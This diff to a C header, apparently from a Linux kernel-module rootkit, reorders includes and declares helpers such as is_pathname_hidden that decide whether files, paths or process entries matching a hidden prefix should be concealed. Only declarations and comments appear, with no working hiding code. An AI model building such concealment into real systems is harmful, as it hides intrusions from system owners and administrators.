@@ -4,14 +4,16 @@
 #include "constants.h"
 #include "macro_utils.h"
 #include "utils.h"
-#include <linux/types.h>
-// types.h is required for dirent.h, so we include it before
 #include <linux/dcache.h>
-#include <linux/dirent.h>
+#include <linux/fcntl.h>
 #include <linux/fdtable.h>
 #include <linux/fs.h>
 #include <linux/magic.h>
+#include <linux/namei.h>
 #include <linux/path.h>
+#include <linux/types.h>
+// dirent.h lacks some includes, so we include it last
+#include <linux/dirent.h>
 
 /**
  * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
@@ -207,8 +209,8 @@ bool is_process_path(const path_t *const p_path, const char **const ps_name, pid
  * @param p_pid    This gets set to the corresponding PID, if the given file structure is a process
  * @return `true` if the given file structure is a process file, `false` otherwise
  */
-static inline bool
-is_process_file(const file_t *const p_file, const char **const ps_name, pid_t *p_pid)
+static inline bool is_process_file(const file_t *const p_file, const char **const ps_name,
+                                   pid_t *p_pid)
 {
     IF_U (p_file == NULL) {
         return false;
@@ -276,6 +278,19 @@ static inline bool is_filename_or_pid_hidden(const char *const s_filename,
  * @return `true` if the given path needs to be hidden, `false` otherwise
  */
 bool is_path_hidden(const path_t *const p_path);
+
+/**
+ * Does the given pathname need to be hidden?
+ * Checks if the pathname is a process file/dir and needs to be hidden,
+ * or if the file name starts with the hidden prefix.
+ * Path is checked twice: first with `AT_SYMLINK_NOFOLLOW`, then with `AT_SYMLINK_FOLLOW`.
+ *
+ * @param i32_dfd    The file descriptor of the directory containing the pathname, or `AT_FDCWD`
+ * @param s_pathname The pathname to check
+ * @param i32_flags  Flags to use when resolving the pathname
+ * @return `true` if the given pathname needs to be hidden, `false` otherwise
+ */
+bool is_pathname_hidden(const int i32_dfd, const char *const s_pathname, int i32_flags);
 
 /**
  * Does the given file need to be hidden?
